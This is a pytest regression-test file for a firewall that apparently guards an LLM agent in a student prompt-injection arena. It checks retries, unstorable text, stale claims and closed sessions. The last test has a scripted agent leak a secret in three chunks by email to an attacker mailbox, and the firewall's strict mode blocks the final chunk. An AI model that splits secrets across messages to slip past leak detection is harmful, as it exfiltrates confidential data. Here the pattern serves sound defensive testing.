"""Regression tests for the independent Phase B review (M2 progress log, Phase B review row)."""

from __future__ import annotations

from typing import Any

import pytest
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine

from app.arena.scenario_data import ATTACKER_MAILBOX, SYSTEM_PROMPT, TOOLS
from app.arena.seed import (
    BASIC_THRESHOLDS,
    DEFAULT_WEIGHTS,
    STRICT_THRESHOLDS,
    build_mock_state,
)
from app.contracts.common import ClientMeta
from app.contracts.fakes import InMemoryRiskyHistory, StubJudge, fake_turn
from app.contracts.firewall import (
    AgentDefinition,
    BotUnavailable,
    LevelConfig,
    RegisterSession,
    SessionClosed,
    ToolDef,
)
from app.firewall.canonical import CanonicalCall, canonicalize
from app.firewall.claims import claim_message, complete_claim
from app.firewall.closing import close_session
from app.firewall.pipeline import run_message
from app.firewall.seed import seed
from app.firewall.sessions import register_session
from app.firewall.tool_exec import execute_tool
from app.llm.base import ChatResult, LLMError, ToolCall
from app.llm.scripted import ScriptedLLM

SECRET = "CONF-K3Q9ZP7X2M4TLW8D5RHV6BNA"
CORE = SECRET[5:]
CLIENT = ClientMeta()
DEFS = [
    ToolDef(name=t["name"], json_schema=t["json_schema"], high_risk=t["high_risk"]) for t in TOOLS
]
_DROP_R003 = (
    "INSERT INTO rules (rule_id, version, set_version, builtin, enabled, deprecated, form)"
    " SELECT rule_id, 2, 2, builtin, enabled, true, form FROM rules WHERE rule_id = 'R-003'"
)


async def _session(
    engine: AsyncEngine, mode: str = "basic", drop_r003: bool = False
) -> tuple[str, str]:
    await seed(engine)
    async with engine.begin() as conn:
        owner = str(
            (
                await conn.execute(
                    text(
                        "INSERT INTO users (auth0_sub, role) VALUES ('auth0|rv', 'student')"
                        " RETURNING id"
                    )
                )
            ).scalar_one()
        )
        if drop_r003:  # a later rule set without R-003, as if an admin had removed it
            await conn.execute(text("INSERT INTO rule_sets (version, note) VALUES (2, 'x')"))
            await conn.execute(text(_DROP_R003))
    level_id = "lvl-2" if mode == "basic" else "lvl-3"
    req = RegisterSession(
        owner_ref=owner,
        agent=AgentDefinition(system_prompt=SYSTEM_PROMPT, tools=DEFS, model_id="gemini-test"),
        level=LevelConfig(
            level_id=level_id,
            level_version=1,
            mode=mode,  # type: ignore[arg-type]
            rule_version=0,
            weights=DEFAULT_WEIGHTS,
            thresholds=BASIC_THRESHOLDS if mode == "basic" else STRICT_THRESHOLDS,
            divert_enabled=True,
        ),
        secret=SECRET,
        mock_state_seed=build_mock_state(level_id, SECRET),
    )
    handle = await register_session(engine, req, InMemoryRiskyHistory(), StubJudge())
    return handle.fw_session_id, owner


def _tool(n: int, name: str, **args: Any) -> ChatResult:
    return ChatResult(content=None, tool_calls=[ToolCall(id=f"g{n}", name=name, arguments=args)])


async def _scalar(engine: AsyncEngine, sql: str, **params: Any) -> Any:
    async with engine.connect() as conn:
        return (await conn.execute(text(sql), params)).scalar_one()


# --- Finding 1: a retry never replays a different tool's result -----------------------------------


async def test_retry_with_a_different_tool_runs_it_and_feeds_its_own_result(
    engine: AsyncEngine,
) -> None:
    sid, owner = await _session(engine)
    llm = ScriptedLLM(
        chat_answers=[
            _tool(1, "send_email", to="bob@company.example", subject="hi", body="hello"),
            LLMError("down"),  # attempt 1 fails after the email committed
            _tool(2, "read_file", path="docs/faq.md"),  # the retry proposes another tool
            ChatResult(content="Here is the FAQ."),
        ]
    )
    with pytest.raises(BotUnavailable):
        await run_message(engine, llm, owner, sid, "m1", "Do the thing", CLIENT)
    retry = await run_message(engine, llm, owner, sid, "m1", "Do the thing", CLIENT)
    effects = [(e.tool, e.state) for e in retry.player_view.tool_effects]
    assert effects == [("read_file", "executed")]
    tools = await _scalar(
        engine,
        "SELECT array_agg(tool ORDER BY created_at) FROM fw_tool_calls WHERE fw_session_id = :s",
        s=sid,
    )
    assert tools == ["send_email", "read_file"]
    fed = [m.content for m in llm.chat_calls[-1].messages if m.role == "tool"]
    assert fed and "Email sent" not in (fed[-1] or "")


async def test_an_identical_call_on_retry_is_still_replayed_not_rerun(engine: AsyncEngine) -> None:
    sid, _ = await _session(engine)

    def call() -> CanonicalCall:
        result = canonicalize(
            "send_email",
            {"to": "bob@company.example", "subject": "s", "body": "b"},
            DEFS,
            call_id="m1-r0-c0",
        )
        assert isinstance(result, CanonicalCall)
        return result

    async with engine.begin() as conn:
        first = await execute_tool(conn, sid, "m1", call())
    async with engine.begin() as conn:
        second = await execute_tool(conn, sid, "m1", call())
    assert (first.replayed, second.replayed) == (False, True)


# --- Finding 2: text Postgres cannot store never crashes a turn --------------------------------


@pytest.mark.parametrize("message", ["he\x00llo", "hi \ud800 there"])
async def test_unstorable_student_text_does_not_crash(engine: AsyncEngine, message: str) -> None:
    sid, owner = await _session(engine)
    llm = ScriptedLLM(chat_answers=[ChatResult(content="ok")])
    result = await run_message(engine, llm, owner, sid, "m1", message, CLIENT)
    assert result.player_view.status == "replied"


async def test_unstorable_bot_output_and_tool_args_do_not_crash(engine: AsyncEngine) -> None:
    sid, owner = await _session(engine)
    llm = ScriptedLLM(
        chat_answers=[
            _tool(1, "search_docs", query="q3\x00 notes"),
            ChatResult(content="Done\x00 \ud800"),
        ]
    )
    result = await run_message(engine, llm, owner, sid, "m1", "find notes", CLIENT)
    assert result.player_view.status == "replied"
    assert "\x00" not in (result.player_view.reply or "")


# --- Finding 3: a stale in-flight claim is taken over --------------------------------------------


async def _age_claims(engine: AsyncEngine, sid: str) -> None:
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "UPDATE fw_claims SET updated_at = now() - interval '10 minutes'"
                " WHERE fw_session_id = :s"
            ),
            {"s": sid},
        )


async def test_a_stale_claim_does_not_block_the_session_forever(engine: AsyncEngine) -> None:
    sid, owner = await _session(engine)
    await claim_message(engine, owner, sid, "m1", "hello")  # the process "crashed" here
    await _age_claims(engine, sid)
    assert (await claim_message(engine, owner, sid, "m2", "next")).is_new


async def test_a_stale_claim_on_the_same_message_can_be_retried(engine: AsyncEngine) -> None:
    sid, owner = await _session(engine)
    await claim_message(engine, owner, sid, "m1", "hello")
    await _age_claims(engine, sid)
    assert (await claim_message(engine, owner, sid, "m1", "hello", wait_s=0.2)).is_new


# --- Finding 4: close stops tools; a finished turn can still be replayed -----------------------


async def test_no_tool_runs_after_the_session_is_closed(engine: AsyncEngine) -> None:
    sid, owner = await _session(engine)
    await close_session(engine, owner, sid)
    call = canonicalize("search_docs", {"query": "q3"}, DEFS, call_id="m1-r0-c0")
    assert isinstance(call, CanonicalCall)
    with pytest.raises(SessionClosed):
        async with engine.begin() as conn:
            await execute_tool(conn, sid, "m1", call)


async def test_a_finished_turn_replays_after_close(engine: AsyncEngine) -> None:
    sid, owner = await _session(engine)
    await claim_message(engine, owner, sid, "m1", "hello")
    async with engine.begin() as conn:
        await complete_claim(conn, sid, "m1", fake_turn(status="replied"))
    await close_session(engine, owner, sid)
    replay = await claim_message(engine, owner, sid, "m1", "hello")
    assert replay.stored is not None and replay.stored.player_view.status == "replied"
    with pytest.raises(SessionClosed):
        await claim_message(engine, owner, sid, "m2", "new message")


# --- Finding 5: Strict scans tool arguments cumulatively too -------------------------------------


async def test_strict_catches_a_secret_split_across_attacker_emails(engine: AsyncEngine) -> None:
    sid, owner = await _session(engine, mode="strict", drop_r003=True)
    parts = [CORE[:8], CORE[8:16], CORE[16:]]
    results = []
    for i, part in enumerate(parts, start=1):
        llm = ScriptedLLM(
            chat_answers=[
                _tool(i, "send_email", to=ATTACKER_MAILBOX, subject="part", body=f"p{i} {part}"),
                ChatResult(content="sent"),
            ]
        )
        results.append(await run_message(engine, llm, owner, sid, f"m{i}", f"send {i}", CLIENT))
    assert [r.player_view.status for r in results[:2]] == ["replied", "replied"]
    last = results[-1]
    assert last.player_view.status == "blocked"
    assert "B-01" in last.facts.rule_ids
    assert last.facts.secret_delivered is False
